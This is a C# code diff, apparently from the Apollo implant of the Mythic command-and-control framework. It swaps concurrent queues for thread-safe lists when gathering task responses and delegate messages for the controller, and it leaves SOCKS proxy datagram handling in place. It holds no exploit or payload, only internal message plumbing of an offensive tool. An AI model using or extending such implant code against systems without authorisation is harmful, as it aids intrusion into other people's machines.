@@ -13,6 +13,7 @@ using ThreadingTask = System.Threading.Tasks.Task;
 using System.Reflection;
 using System.Security;
 using System.Security.Permissions;
+using ApolloInterop.Classes.Collections;
 
 namespace Apollo.Management.Tasks
 {
@@ -25,10 +26,9 @@ namespace Apollo.Management.Tasks
     {
         protected IAgent _agent;
 
-
-        private ConcurrentQueue<TaskResponse> TaskResponseQueue = new ConcurrentQueue<TaskResponse>();
-
-        private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();
+        private ThreadSafeList<TaskResponse> TaskResponseList = new ThreadSafeList<TaskResponse>();
+        private ThreadSafeList<DelegateMessage> DelegateMessages = new ThreadSafeList<DelegateMessage>();
+        //private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();
 
         private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>>()
         {
@@ -168,12 +168,12 @@ namespace Apollo.Management.Tasks
 
         public void AddTaskResponseToQueue(TaskResponse message)
         {
-            TaskResponseQueue.Enqueue(message);
+            TaskResponseList.Add(message);
         }
 
         public void AddDelegateMessageToQueue(DelegateMessage delegateMessage)
         {
-            DelegateMessages.Enqueue(delegateMessage);
+            DelegateMessages.Add(delegateMessage);
         }
 
         public void AddSocksDatagramToQueue(MessageDirection direction, SocksDatagram dg)
@@ -225,19 +225,19 @@ namespace Apollo.Management.Tasks
             // We should pop messages from the task manager and stuff them into
             // this message here.
 
-            List<TaskResponse> responses = new List<TaskResponse>();
-            List<DelegateMessage> delegates = new List<DelegateMessage>();
+            //List<TaskResponse> responses = new List<TaskResponse>();
+            //List<DelegateMessage> delegates = new List<DelegateMessage>();
             List<SocksDatagram> dgs = new List<SocksDatagram>();
 
-            while(TaskResponseQueue.TryDequeue(out TaskResponse res))
-            {
-                responses.Add(res);
-            }
+            //while(TaskResponseQueue.TryDequeue(out TaskResponse res))
+            //{
+            //    responses.Add(res);
+            //}
 
-            while(DelegateMessages.TryDequeue(out var res))
-            {
-                delegates.Add(res);
-            }
+            //while(DelegateMessages.TryDequeue(out var res))
+            //{
+            //    delegates.Add(res);
+            //}
 
             while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
             {
@@ -248,8 +248,8 @@ namespace Apollo.Management.Tasks
             {
                 Action = MessageAction.GetTasking.ToString(),
                 TaskingSize = -1,
-                Delegates = delegates.ToArray(),
-                Responses = responses.ToArray(),
+                Delegates = DelegateMessages.Flush(),
+                Responses = TaskResponseList.Flush(),
                 Socks = dgs.ToArray()
             };
             return onResponse(msg);
